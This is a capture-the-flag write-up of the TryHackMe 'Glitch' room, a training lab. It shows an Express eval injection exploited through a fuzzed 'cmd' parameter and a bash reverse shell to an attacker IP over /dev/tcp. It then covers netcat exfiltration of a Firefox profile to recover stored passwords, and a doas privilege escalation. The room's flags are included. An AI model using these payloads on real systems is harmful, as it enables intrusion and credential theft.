# Tryhackme.com Room : GLITCH

`https://tryhackme.com/room/glitch`

## Instance

```bash
export IP="10.10.40.42"
```

## Nmap

```
PORT   STATE SERVICE VERSION
80/tcp open  http    nginx 1.14.0 (Ubuntu)
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: nginx/1.14.0 (Ubuntu)
|_http-title: not allowed
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

## Initial Foothold

Seems like we only have a website running on port `80` 

The website is only a static image.

We find this javascript :

```javascript
function getAccess() {
        fetch('/api/access')
          .then((response) => response.json())
          .then((response) => {
            console.log(response);
          });
      }
```

Calling the `getAccess()` function from the console, we get the following token

```
dGhpc19pc19ub3RfcmVhbA==
```

Which is `base64` for 

```
this_is_not_real
```

Calling the function/visiting the endpoint multiple time always return the same output



Setting the cookie value `token:this_is_not_real` we get access to more stuff on the website

Some javascript call the endpoint `/api/items` which return

```json
{
    sins: [
        "lust",
        "gluttony",
        "greed",
        "sloth",
        "wrath",
        "envy",
        "pride"
    ],
    errors: [
        "error",
        "error",
        "error",
        "error",
        "error",
        "error",
        "error",
        "error",
        "error"
    ],
    deaths: [
    	"death"
    ]
}
```



which translate to a bunch of glitch art image being inserted in the page.

Hmm doesn't seem to have much in there



let's gobuster the `/api` endpoint see what else is there. Doesn't seems like we need a valid token to access `/api/items` only `/` change when we have a valid token



gobuster didn't return anything interesting.

We try a post on `/api/items`

```bash
curl -X POST http://$IP/api/items
```

We get this answer

```json
{
    "message":"there_is_a_glitch_in_the_matrix"
}
```

Hmmm, not sure what to do with this tho, tried to use it as the value for the token with no success.

Whatever the value sent via post, we get the same answer.

Sooo, tried fuzzing `post` parameters, couldn't find anything.

Looked at a write up, didn't think to fuzz the `GET` parameters.. let's do it

```bash
wfuzz -z file,/usr/share/wordlists/seclists/Discovery/Web-Content/common.txt --hc 400 -X POST http://$IP/api/items?FUZZ=FUZZ
```

After a while we get a hit on the parameter `cmd`

```
curl -X POST http://$IP/api/items?cmd=1
```

give us

```
vulnerability_exploited 1
```

If we use `cmd=ls` we get this error

```javascript
ReferenceError: ls is not defined
    at eval (eval at router.post (/var/web/routes/api.js:25:60), <anonymous>:1:1)
    at router.post (/var/web/routes/api.js:25:60)
    at Layer.handle [as handle_request] (/var/web/node_modules/express/lib/router/layer.js:95:5)
    at next (/var/web/node_modules/express/lib/router/route.js:137:13)
    at Route.dispatch (/var/web/node_modules/express/lib/router/route.js:112:3)
    at Layer.handle [as handle_request] (/var/web/node_modules/express/lib/router/layer.js:95:5)
    at /var/web/node_modules/express/lib/router/index.js:281:22
    at Function.process_params (/var/web/node_modules/express/lib/router/index.js:335:12)
    at next (/var/web/node_modules/express/lib/router/index.js:275:10)
    at Function.handle (/var/web/node_modules/express/lib/router/index.js:174:3)
```

We see that this is a node js server running express which run `eval` on our input.



We can test our code execution using something like this :

```
curl -X POST 'http://10.10.77.117/api/items?cmd=require("child_process").exec("curl%2010.2.13.34:8000/test")'
```

This send us an http request. Note the `%20` for the space char, otherwise we get errors.



Now let's get a shell. We use the following payload

```
require("child_process").exec("bash -c 'bash -i >& /dev/tcp/10.2.13.34/7777 0>&1'")
```

Which translate to this when URL encoded :

```
curl -X POST 'http://10.10.77.117/api/items?cmd=require%28%22child_process%22%29.exec%28%22bash%20-c%20%27bash%20-i%20%3E%26%20/dev/tcp/10.2.13.34/7777%200%3E%261%27%22%29'
```



We finally have a shell on the box.

We find `/home/user/user.txt`

```
THM{i_don't_know_why}
```

## Priv esc

We don't have the user password so we can't `sudo -l` 

Doesn't seem to have interesting cron job running.

Searching for `suid` binaries `find / -perm -4000 2>/dev/null`

We find `doas` which is compiled from `/opt/doas` might be usefull ?



There is also a user `v0id` but doesn't seem to own interesting files

Hmmm, runned `linpeas` but didn't find anything usefull



Soooo, after a while running around in circle, I looked at a writeup, found that we need to decrypt the firefox profile in `~/.firefox`.

Didn't think about that. We use `https://github.com/unode/firefox_decrypt` to do so.

Need to exfiltrate the .firefox folder, we do so by first `tar -zcvf firefox.tar.gz .firefox` 

Then I tried to run a python http server but couldn't access it (ports doesn't seem to be available for some reason). Exfiltrated usin netcat (https://nakkaya.com/2009/04/15/using-netcat-for-file-transfers/)

We find these credentials :

```
Website:   https://glitch.thm
Username: 'v0id'
Password: 'love_the_void'
```



We can now `su` into the `v0id` user.

We can't `sudo` maybe `doas` ?



Yep, here is the doas config file

```
cat /usr/local/etc/doas.conf
permit v0id as root
```

Now we just need to run `doas /bin/bash` and we are root !

We find the root flag `/root/root.txt`:

```
THM{diamonds_break_our_aching_minds}
```



## End

